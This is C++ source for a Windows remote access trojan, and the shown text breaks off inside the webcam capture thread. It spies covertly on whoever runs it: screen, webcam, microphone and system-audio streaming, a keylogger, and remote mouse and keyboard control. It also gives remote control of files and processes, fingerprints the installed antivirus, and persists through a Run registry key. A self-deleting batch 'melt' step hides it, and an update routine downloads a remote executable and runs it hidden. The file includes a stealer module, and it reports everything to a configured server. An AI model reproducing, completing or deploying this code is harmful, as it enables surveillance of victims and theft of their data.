#define _WIN32_WINNT 0x0600
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <gdiplus.h>
#include <vector>
#include <string>
#include <shlobj.h>
#include <wininet.h>
#include <mmsystem.h>
#include <dshow.h>
#include <tlhelp32.h>
#include <sstream>
#include <time.h>
#include <wbemidl.h>
#include <cstdio>
#include <cstring>
#include <cwchar>

// MinGW Compat
#ifndef sprintf
#define sprintf(buf, fmt, ...) snprintf(buf, 4096, fmt, ##__VA_ARGS__)
#endif

#define MINIAUDIO_IMPLEMENTATION
#define MA_NO_DECODING
#define MA_NO_ENCODING
#include "miniaudio.h"
#include "obfuscation.h"
#include "api_loader.h"
#include "core.h"
#include "core.cpp"
#include "stealer.cpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "quartz.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wbemuuid.lib")

using namespace Gdiplus;
using namespace std;

// --- Config Variables (Linked from config.o) ---
extern "C" {
    extern char SERVER_IP[64];
    extern int SERVER_PORT;
    extern char MUTEX_NAME[64];
    extern char TARGET_FILE_NAME[64];
    extern char INSTALL_ENV[32];
    extern char AES_KEY[64];
    extern int ENABLE_ANTI_VM;
    extern int ENABLE_INSTALLATION;
}

#define BUF_SIZE 4096

// --- API Hiding (Dynamic Import) ---
typedef HHOOK (WINAPI *pSetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *pUnhookWindowsHookEx)(HHOOK);
typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);

pSetWindowsHookExA fnSetWindowsHookExA = NULL;
pUnhookWindowsHookEx fnUnhookWindowsHookEx = NULL;
pCallNextHookEx fnCallNextHookEx = NULL;

void LoadCriticalAPIs() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        fnSetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser32, "SetWindowsHookExA");
        fnUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, "UnhookWindowsHookEx");
        fnCallNextHookEx = (pCallNextHookEx)GetProcAddress(hUser32, "CallNextHookEx");
    }
}

// --- Global Variables ---
HANDLE hChildStd_IN_Rd = NULL, hChildStd_IN_Wr = NULL;
HANDLE hChildStd_OUT_Rd = NULL, hChildStd_OUT_Wr = NULL;
HANDLE hScreenThread = NULL, hAudioThread = NULL, hCamThread = NULL, hKeylogThread = NULL;
HANDLE hChatThreadHandle = NULL;
bool bHVNCRunning = false;

volatile bool bScreenRunning = false, bCamRunning = false, bKeylogRunning = false;
volatile bool bMicRunning = false, bSysRunning = false, bChatRunning = false, bChatForceClose = false;

ma_context globalCtx;
ma_device micDevice, sysDevice;
bool bMicInit = false, bSysInit = false, bCtxInit = false;
int audioSampleRate = 48000;

volatile int targetFPS = 10, jpegQuality = 50, targetMonitor = 0;
volatile int camFPS = 10, camQuality = 50, targetCam = 0;

HWND hChatWnd = NULL, hChatEditHist = NULL, hChatEditInput = NULL, hChatBtnSend = NULL;
HFONT hChatFont = NULL;
char chatAdminName[128] = "Admin";

struct MonitorInfo { HMONITOR hMonitor; RECT rcMonitor; }; 
vector<MonitorInfo>* monitors = NULL;
HHOOK hKeyboardHook = NULL;
char lastWindowTitle[256] = "";
char BS = 92; 

// --- DirectShow Definitions ---
static const IID IID_ISampleGrabberCB = { 0x0579154A, 0x2B53, 0x4994, { 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85 } };
static const IID IID_ISampleGrabber = { 0x6B652FFF, 0x11FE, 0x4fce, { 0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F } };
static const CLSID CLSID_SampleGrabber = { 0xC1F400A0, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };
static const CLSID CLSID_NullRenderer = { 0xC1F400A4, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };

interface ISampleGrabberCB : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SampleCB(double SampleTime, IMediaSample *pSample) = 0;
    virtual HRESULT STDMETHODCALLTYPE BufferCB(double SampleTime, BYTE *pB, long BufferLen) = 0;
};

interface ISampleGrabber : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL OneShot) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE *pType) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE *pType) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL BufferThem) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long *pBufferSize, long *pBuffer) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetGetCurrentSample(IMediaSample **ppSample) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetCallback(ISampleGrabberCB *pCallback, long WhichMethodToCallback) = 0;
};

#include "hvnc.cpp"

// --- Forward Declarations ---
DWORD WINAPI ReadFromCmd(LPVOID p); 
DWORD WINAPI WriteToCmd(LPVOID p);
DWORD WINAPI MonitorThread(LPVOID p);
DWORD WINAPI ChatThread(LPVOID p);
DWORD WINAPI ScreenThread(LPVOID p);
DWORD WINAPI CamThread(LPVOID p);

void ListDrives(); void ListDirectory(const char* pUtf8); void DownloadFile(const char* p); void WriteLocalFile(const char* d, int l); void DeleteFileOrDir(const char* p); void MakeDirectory(const char* p);
void ListProcesses(); void KillProcess(int pid); void SendSysInfo();
void HandleMouseInput(const char* d); void HandleKeyInput(const char* d);
void StartChat(const char* n); void StopChat(); void AppendChatMessage(const char* t); LRESULT CALLBACK ChatWndProc(HWND hw, UINT m, WPARAM w, LPARAM l);
void StartMic(int i); void StopMic(); void StartSys(int i); void StopSys(); void ListAudioDevices();
void StartKeylogger(); void StopKeylogger(); void RefreshMonitors(); void CaptureAndSendScreen();
void ListCams(); void SysInternalOpen(char* p, DWORD s);
wstring Utf8ToWide(const string& s); string WideToUtf8(const wstring& w); int GetEncoderClsid(const WCHAR* f, CLSID* p);
void Restart(); void Uninstall(); void Update(const char* u); void Melt(char* s); void Install(); bool CheckMutex(); bool RecvAll(SOCKET s, char* b, int l);

// --- Helpers ---
wstring Utf8ToWide(const string& s) { if (s.empty()) return L""; int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0); wstring w(sz, 0); MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], sz); if (sz > 0) w.resize(sz - 1); return w; }
string WideToUtf8(const wstring& w) { if (w.empty()) return ""; int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL); string s(sz, 0); WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, NULL, NULL); if (sz > 0) s.resize(sz - 1); return s; }
bool RecvAll(SOCKET s, char* b, int l) { int t = 0; while (t < l) { int r = recv(s, b + t, l - t, 0); if (r <= 0) return false; t += r; } return true; }
string EscapeJson(const string& in) { string out = ""; for (char c : in) { if (c == '\\') out.append("\\\\"); else if (c == '"') out.append("\""); else if ((unsigned char)c < 32) { char buf[16]; snprintf(buf, sizeof(buf), "\u%04x", (unsigned int)c); out.append(buf); } else out.push_back(c); } return out; }
int GetEncoderClsid(const WCHAR* f, CLSID* p) { UINT n = 0, s = 0; GetImageEncodersSize(&n, &s); if (s == 0) return -1; ImageCodecInfo* pi = (ImageCodecInfo*)(malloc(s)); GetImageEncoders(n, s, pi); for (UINT j = 0; j < n; ++j) { if (wcscmp(pi[j].MimeType, f) == 0) { *p = pi[j].Clsid; free(pi); return j; } } free(pi); return -1; }

// --- Extra Helpers ---
string GetHWID() { DWORD v = 0; if (GetVolumeInformationA("C:\\", NULL, 0, &v, NULL, NULL, NULL, 0)) { char b[16]; snprintf(b, sizeof(b), "%08lX", v); return string(b); } return "UNKNOWN_HWID"; }
string GetUptime() { ULONGLONG t = GetTickCount64(); long long s = t / 1000; long long d = s / 86400; s %= 86400; long long h = s / 3600; s %= 3600; long long m = s / 60; char b[64]; if (d > 0) snprintf(b, sizeof(b), "%lldd %lldh %lldm", d, h, m); else snprintf(b, sizeof(b), "%lldh %lldm", h, m); return string(b); }
string GetAntivirus() {
    string av = "None"; HRESULT hres; hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    IWbemLocator *pLoc = NULL; hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc); if (FAILED(hres)) return av;
    IWbemServices *pSvc = NULL; BSTR bstrNamespace = SysAllocString(L"ROOT\\SecurityCenter2"); hres = pLoc->ConnectServer(bstrNamespace, NULL, NULL, 0, 0, 0, 0, &pSvc); SysFreeString(bstrNamespace);
    if (FAILED(hres)) { pLoc->Release(); return av; } hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); return av; } IEnumWbemClassObject* pEnumerator = NULL; BSTR bstrLang = SysAllocString(L"WQL"); BSTR bstrQuery = SysAllocString(L"SELECT * FROM AntivirusProduct");
    hres = pSvc->ExecQuery(bstrLang, bstrQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator); SysFreeString(bstrLang); SysFreeString(bstrQuery);
    if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); return av; } IWbemClassObject *pclsObj = NULL; ULONG uReturn = 0;
    if (pEnumerator) { if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == 0) { VARIANT vtProp; pclsObj->Get(L"displayName", 0, &vtProp, 0, 0); av = WideToUtf8(vtProp.bstrVal); VariantClear(&vtProp); pclsObj->Release(); } pEnumerator->Release(); } pSvc->Release(); pLoc->Release(); return av;
}

// --- Features ---
void ListDrives() { DWORD d = GetLogicalDrives(); string j = "["; bool first = true; for (int i = 0; i < 26; i++) { if (d & (1 << i)) { if (!first) j.append(","); first = false; char drv[10]; snprintf(drv, sizeof(drv), "%c:\\", (char)('A' + i)); j.append("{\"name\":\""); j.append(drv); j.append("\",\"is_dir\":true,\"size\":0}"); } } j.append("]"); SendPacket(TYPE_FILE_LS_RES, j.c_str(), (int)j.length()); }
void ListDirectory(const char* pUtf8) { if (strlen(pUtf8) == 0 || strcmp(pUtf8, "root") == 0) { ListDrives(); return; } wstring pathW = Utf8ToWide(pUtf8); if (pathW.length() > 0 && pathW.back() == (wchar_t)BS) pathW.pop_back(); wstring search = pathW; search.append(L"\\*"); WIN32_FIND_DATAW ffd; HANDLE hFind = FindFirstFileW(search.c_str(), &ffd); if (hFind == INVALID_HANDLE_VALUE) { SendPacket(TYPE_FILE_LS_RES, "[]", 2); return; } string json = "["; bool first = true; do { if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue; if (!first) json.append(","); first = false; string name = EscapeJson(WideToUtf8(ffd.cFileName)); bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0; long long sz = ((long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow; json.append("{\"name\":"); json.append(name); json.append(",\"is_dir\":"); json.append(isDir ? "true" : "false"); json.append(",\"size\":"); json.append(to_string(sz)); json.append("}"); } while (FindNextFileW(hFind, &ffd) != 0); json.append("]"); FindClose(hFind); SendPacket(TYPE_FILE_LS_RES, json.c_str(), (int)json.length()); }
void DownloadFile(const char* p) { wstring w = Utf8ToWide(p); HANDLE h = CreateFileW(w.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0); if (h != INVALID_HANDLE_VALUE) { DWORD s = GetFileSize(h, 0); if (s > 0) { char* b = (char*)malloc(s); DWORD r; if (ReadFile(h, b, s, &r, 0)) SendPacket(TYPE_FILE_DOWN_RES, b, s); free(b); } CloseHandle(h); } } 
void WriteLocalFile(const char* d, int l) { int pl = (int)strlen(d); if (pl >= l) return; string p(d); wstring w = Utf8ToWide(p); const char* c = d + pl + 1; int cl = l - pl - 1; HANDLE h = CreateFileW(w.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0); if (h != INVALID_HANDLE_VALUE) { DWORD r; WriteFile(h, c, cl, &r, 0); CloseHandle(h); } } 
void DeleteFileOrDir(const char* p) { wstring w = Utf8ToWide(p); if (!DeleteFileW(w.c_str())) RemoveDirectoryW(w.c_str()); } 
void MakeDirectory(const char* p) { wstring w = Utf8ToWide(p); CreateDirectoryW(w.c_str(), NULL); }
void ListProcesses() { HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap == INVALID_HANDLE_VALUE) return; PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); if (!Process32First(hSnap, &pe)) { CloseHandle(hSnap); return; } string json = "["; bool first = true; do { if (!first) json.append(","); first = false; string name = EscapeJson(pe.szExeFile); json.append("{\"pid\":"); json.append(to_string((int)pe.th32ProcessID)); json.append(",\"name\":\""); json.append(name); json.append("\",\"threads\":"); json.append(to_string((int)pe.cntThreads)); json.append("}"); } while (Process32Next(hSnap, &pe)); json.append("]"); CloseHandle(hSnap); SendPacket(TYPE_PROC_LS_RES, json.c_str(), (int)json.length()); }
void KillProcess(int pid) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid); if (h) { TerminateProcess(h, 0); CloseHandle(h); } }
void SendSysInfo() { char pc[MAX_PATH]; DWORD sz = MAX_PATH; GetComputerNameA(pc, &sz); char cpu[256] = "Unknown CPU"; HKEY hKey; if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) { DWORD cpuSz = sizeof(cpu); RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpu, &cpuSz); RegCloseKey(hKey); } char gpu[256] = "Unknown GPU"; DISPLAY_DEVICEA dd; dd.cb = sizeof(dd); if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) strncpy(gpu, dd.DeviceString, sizeof(gpu)-1); MEMORYSTATUSEX st; st.dwLength = sizeof(st); GlobalMemoryStatusEx(&st); int ram = (int)(st.ullTotalPhys / (1024 * 1024 * 1024)); char cnt[128] = "Unknown"; GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGCOUNTRY, cnt, sizeof(cnt)); string hwid = GetHWID(); string av = GetAntivirus(); string up = GetUptime(); string j = "{\"pc_name\":\"" + string(pc) + "\",\"os\":\"Windows 10/11\",\"cpu\":\"" + EscapeJson(cpu) + "\",\"gpu\":\"" + EscapeJson(gpu) + "\",\"ram_total\":\"" + to_string(ram) + "GB\",\"country\":\"" + string(cnt) + "\",\"hwid\":\"" + hwid + "\",\"antivirus\":\"" + EscapeJson(av) + "\",\"uptime\":\"" + up + "\"}"; SendPacket(TYPE_SYS_INFO, j.c_str(), (int)j.length()); }
BOOL CALLBACK MonEnumProc(HMONITOR h, HDC hdc, LPRECT r, LPARAM d) { MonitorInfo mi = { h, *r }; if (monitors) monitors->push_back(mi); return TRUE; }
void RefreshMonitors() { if (!monitors) monitors = new vector<MonitorInfo>(); monitors->clear(); EnumDisplayMonitors(NULL, NULL, MonEnumProc, 0); string l = ""; for (size_t i = 0; i < monitors->size(); i++) { char t[64]; snprintf(t, sizeof(t), "%d:%dx%d;", (int)i, (int)((*monitors)[i].rcMonitor.right - (*monitors)[i].rcMonitor.left), (int)((*monitors)[i].rcMonitor.bottom - (*monitors)[i].rcMonitor.top)); l += t; } SendPacket(TYPE_MONITOR_LIST, l.c_str(), (int)l.length()); }
void HandleMouseInput(const char* d) { float rx, ry; int f; if (sscanf(d, "%f,%f,%d", &rx, &ry, &f) == 3) { if (!monitors || monitors->empty()) RefreshMonitors(); int idx = targetMonitor >= (int)monitors->size() ? 0 : targetMonitor; RECT r = (*monitors)[idx].rcMonitor; int sX = r.left + (int)(rx * (r.right - r.left)), sY = r.top + (int)(ry * (r.bottom - r.top)); int vX = GetSystemMetrics(SM_XVIRTUALSCREEN), vY = GetSystemMetrics(SM_YVIRTUALSCREEN), vW = GetSystemMetrics(SM_CXVIRTUALSCREEN), vH = GetSystemMetrics(SM_CYVIRTUALSCREEN); INPUT i = { 0 }; i.type = INPUT_MOUSE; i.mi.dx = (LONG)(((sX - vX) * 65535) / vW); i.mi.dy = (LONG)(((sY - vY) * 65535) / vH); i.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_MOVE; if (f & 1) i.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN; if (f & 2) i.mi.dwFlags |= MOUSEEVENTF_LEFTUP; if (f & 4) i.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN; if (f & 8) i.mi.dwFlags |= MOUSEEVENTF_RIGHTUP; SendInput(1, &i, sizeof(INPUT)); } } 
void HandleKeyInput(const char* d) { int k, w; if (sscanf(d, "%d,%d", &k, &w) == 2) { INPUT i = { 0 }; i.type = INPUT_KEYBOARD; i.ki.wVk = (WORD)k; if (w == 0) i.ki.dwFlags = KEYEVENTF_KEYUP; SendInput(1, &i, sizeof(INPUT)); } }
void CaptureAndSendScreen() { if (!monitors || monitors->empty()) RefreshMonitors(); int i = (targetMonitor >= (int)monitors->size()) ? 0 : targetMonitor; RECT r = (*monitors)[i].rcMonitor; int w = r.right - r.left, h = r.bottom - r.top; HDC hS = GetDC(NULL), hM = CreateCompatibleDC(hS); HBITMAP hB = CreateCompatibleBitmap(hS, w, h); SelectObject(hM, hB); BitBlt(hM, 0, 0, w, h, hS, r.left, r.top, SRCCOPY); CURSORINFO ci = { 0 }; ci.cbSize = sizeof(ci); if (GetCursorInfo(&ci) && (ci.flags == CURSOR_SHOWING)) { ICONINFO ii = { 0 }; if (GetIconInfo(ci.hCursor, &ii)) { DrawIcon(hM, ci.ptScreenPos.x - r.left - ii.xHotspot, ci.ptScreenPos.y - r.top - ii.yHotspot, ci.hCursor); if (ii.hbmMask) DeleteObject(ii.hbmMask); if (ii.hbmColor) DeleteObject(ii.hbmColor); } } IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps); Bitmap* b = new Bitmap(hB, NULL); CLSID c; GetEncoderClsid(L"image/jpeg", &c); EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong; ep.Parameter[0].NumberOfValues = 1; ULONG q = (ULONG)jpegQuality; ep.Parameter[0].Value = &q; b->Save(ps, &c, &ep); LARGE_INTEGER lz = { 0 }; ULARGE_INTEGER pos; ps->Seek(lz, STREAM_SEEK_END, &pos); ps->Seek(lz, STREAM_SEEK_SET, NULL); DWORD sz = (DWORD)pos.QuadPart; char* buf = (char*)malloc(sz); ULONG br; ps->Read(buf, sz, &br); SendPacket(TYPE_SCREEN_FRAME, buf, sz); free(buf); delete b; DeleteObject(hB); DeleteDC(hM); ReleaseDC(NULL, hS); ps->Release(); }
DWORD WINAPI ScreenThread(LPVOID p) { while (bScreenRunning) { DWORD st = GetTickCount(); CaptureAndSendScreen(); DWORD el = GetTickCount() - st; int d = 1000 / targetFPS; if (el < (DWORD)d) Sleep(d - el); } return 0; }
void Restart() { char s[MAX_PATH]; GetModuleFileNameA(NULL, s, MAX_PATH); ShellExecuteA(NULL, "open", s, NULL, NULL, SW_HIDE); exit(0); }
void Uninstall() { HKEY k; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) { RegDeleteValueA(k, TARGET_FILE_NAME); RegCloseKey(k); } char s[MAX_PATH]; GetModuleFileNameA(NULL, s, MAX_PATH); MoveFileExA(s, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); exit(0); }
void Melt(char* s) { char b[MAX_PATH]; GetTempPathA(MAX_PATH, b); strcat(b, "m.bat"); FILE* f = fopen(b, "w"); if (f) { fprintf(f, "@echo off\n:l\ndel \"%s\"\nif exist \"%s\" goto l\ndel \"%%~f0\"\n", s, s); fclose(f); ShellExecuteA(0, "open", b, 0, 0, SW_HIDE); } }
void Update(const char* u) { char t[MAX_PATH]; GetTempPathA(MAX_PATH, t); strcat(t, "upd.exe"); HINTERNET h = InternetOpenA("GA", 0, 0, 0, 0); HINTERNET f = InternetOpenUrlA(h, u, 0, 0, 0, 0); if (f) { HANDLE o = CreateFileA(t, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0); char b[1024]; DWORD r, w; while (InternetReadFile(f, b, 1024, &r) && r > 0) WriteFile(o, b, r, &w, 0); CloseHandle(o); InternetCloseHandle(f); InternetCloseHandle(h); ShellExecuteA(0, "open", t, 0, 0, SW_HIDE); exit(0); } }
void Install() { char s[MAX_PATH], d[MAX_PATH], t[MAX_PATH]; GetModuleFileNameA(0, s, MAX_PATH); if (strcmp(INSTALL_ENV, "APPDATA") == 0) GetEnvironmentVariableA("APPDATA", d, MAX_PATH); else GetEnvironmentVariableA("TEMP", d, MAX_PATH); snprintf(t, sizeof(t), "%s%c%s", d, BS, TARGET_FILE_NAME); if (strcmpi(s, t) != 0) { CopyFileA(s, t, 0); HKEY k; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) { RegSetValueExA(k, TARGET_FILE_NAME, 0, REG_SZ, (const BYTE*)t, (int)strlen(t) + 1); RegCloseKey(k); } ShellExecuteA(0, "open", t, 0, 0, SW_HIDE); Melt(s); exit(0); } }
bool CheckMutex() { CreateMutexA(0, 0, MUTEX_NAME); return (GetLastError() == ERROR_ALREADY_EXISTS); }
void DataCallback(ma_device* p, void* o, const void* i, ma_uint32 c) { if (c > 0 && i) SendPacket((int)(intptr_t)p->pUserData, i, c * 2); }
void InitAudioCtx() { if (!bCtxInit) { ma_context_config ctxConfig = ma_context_config_init(); bCtxInit = (ma_context_init(NULL, 0, &ctxConfig, &globalCtx) == MA_SUCCESS); } }
void StartMic(int id) { if (bMicRunning) return; InitAudioCtx(); ma_device_config c = ma_device_config_init(ma_device_type_capture); c.capture.format = ma_format_s16; c.capture.channels = 1; c.sampleRate = audioSampleRate; c.dataCallback = DataCallback; c.pUserData = (void*)(intptr_t)TYPE_AUDIO_MIC_DATA; ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (bCtxInit && ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { if (id >= 0 && id < (int)capc) c.capture.pDeviceID = &cap[id].id; } if (ma_device_init(bCtxInit ? &globalCtx : NULL, &c, &micDevice) == MA_SUCCESS && ma_device_start(&micDevice) == MA_SUCCESS) bMicRunning = bMicInit = true; }
void StopMic() { if (bMicRunning) { ma_device_stop(&micDevice); ma_device_uninit(&micDevice); bMicRunning = bMicInit = false; } }
void StartSys(int id) { if (bSysRunning) return; InitAudioCtx(); ma_device_config c = ma_device_config_init(ma_device_type_loopback); c.capture.format = ma_format_s16; c.capture.channels = 2; c.sampleRate = audioSampleRate; c.dataCallback = DataCallback; c.pUserData = (void*)(intptr_t)TYPE_AUDIO_SYS_DATA; ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (bCtxInit && ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { if (id >= 0 && id < (int)pbc) c.playback.pDeviceID = &pb[id].id; } if (ma_device_init(bCtxInit ? &globalCtx : NULL, &c, &sysDevice) == MA_SUCCESS && ma_device_start(&sysDevice) == MA_SUCCESS) bSysRunning = bSysInit = true; } 
void StopSys() { if (bSysRunning) { ma_device_stop(&sysDevice); ma_device_uninit(&sysDevice); bSysRunning = bSysInit = false; } }
void ListAudioDevices() { InitAudioCtx(); string r = "AUDIO_DEVS:"; bool found = false; if (bCtxInit) { ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { for (ma_uint32 i = 0; i < capc; i++) { char e[256]; snprintf(e, sizeof(e), "C:%d:%s;", (int)i, cap[i].name); r.append(e); found = true; } for (ma_uint32 i = 0; i < pbc; i++) { char e[256]; snprintf(e, sizeof(e), "P:%d:%s;", (int)i, pb[i].name); r.append(e); found = true; } } } if (!found) { r.append("C:0:Default Mic;P:0:Default System;"); } SendPacket(TYPE_AUDIO_DEV_LIST, r.c_str(), (int)r.length()); }
void ListCams() { CoInitialize(NULL); ICreateDevEnum* pDE = NULL; IEnumMoniker* pE = NULL; CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDE); if (pDE) { pDE->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pE, 0); if (pE) { IMoniker* pM = NULL; string l = ""; int idx = 0; while (pE->Next(1, &pM, NULL) == S_OK) { IPropertyBag* pB; pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pB); VARIANT v; VariantInit(&v); pB->Read(L"FriendlyName", &v, 0); if (idx > 0) l.append(";"); char e[256]; snprintf(e, sizeof(e), "%d:%s", idx++, WideToUtf8(v.bstrVal).c_str()); l.append(e); VariantClear(&v); pB->Release(); pM->Release(); } SendPacket(TYPE_CAM_LIST, l.c_str(), (int)l.length()); pE->Release(); } else SendPacket(TYPE_CAM_LIST, "", 0); pDE->Release(); } CoUninitialize(); }
DWORD WINAPI CamThread(LPVOID p) {
    CoInitialize(NULL); IGraphBuilder* pG; ICaptureGraphBuilder2* pB; IBaseFilter *pC, *pGF, *pN; ISampleGrabber* pS; IMediaControl* pMC; IEnumMoniker* pE; ICreateDevEnum* pDE;
    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pG); CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pB); pB->SetFiltergraph(pG);
    CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDE); pDE->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pE, 0);
    IMoniker* pM = NULL; for(int i=0; i<=targetCam; i++) { if (pE->Next(1, &pM, NULL) != S_OK) { pM = NULL; break; } if (i < targetCam) pM->Release(); }
    if (pM) {
        pM->BindToObject(0, 0, IID_IBaseFilter, (void**)&pC); pG->AddFilter(pC, L"C"); CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pGF); pG->AddFilter(pGF, L"Grab"); pGF->QueryInterface(IID_ISampleGrabber, (void**)&pS);
        AM_MEDIA_TYPE mt; ZeroMemory(&mt, sizeof(mt)); mt.majortype = MEDIATYPE_Video; mt.subtype = MEDIASUBTYPE_RGB24; pS->SetMediaType(&mt); pS->SetBufferSamples(TRUE);
        CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pN); pG->AddFilter(pN, L"Null"); pB->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pC, pGF, pN);
        pG->QueryInterface(IID_IMediaControl, (void**)&pMC); pMC->Run();
        while(bCamRunning) {
            long sz = 0; if(pS->GetCurrentBuffer(&sz, NULL) == S_OK && sz > 0) {
                char* b = (char*)malloc(sz); pS->GetCurrentBuffer(&sz, (long*)b); AM_MEDIA_TYPE mt2; pS->GetConnectedMediaType(&mt2); VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)mt2.pbFormat;
                IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps); Bitmap* bmp = new Bitmap(vih->bmiHeader.biWidth, vih->bmiHeader.biHeight, vih->bmiHeader.biWidth * 3, PixelFormat24bppRGB, (BYTE*)b);
                bmp->RotateFlip(RotateNoneFlipY); CLSID c; GetEncoderClsid(L"image/jpeg", &c); EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong; ep.Parameter[0].NumberOfValues = 1; ULONG q = (ULONG)camQuality; ep.Parameter[0].Value = &q; 
                bmp->Save(ps, &c, &ep); LARGE_INTEGER lz = { 0 }; ULARGE_INTEGER pos; ps->Seek(lz, STREAM_SEEK_END, &pos); ps->Seek(lz, STREAM_SEEK_SET, NULL); DWORD jsz = (DWORD)pos.QuadPart; char* jb = (char*)malloc(jsz); ULONG br; ps->Read(jb, jsz, &br); SendPacket(TYPE_CAM_FRAME, jb, jsz); free(jb); free(b); delete bmp; ps->Release();
            } Sleep(1000/camFPS);
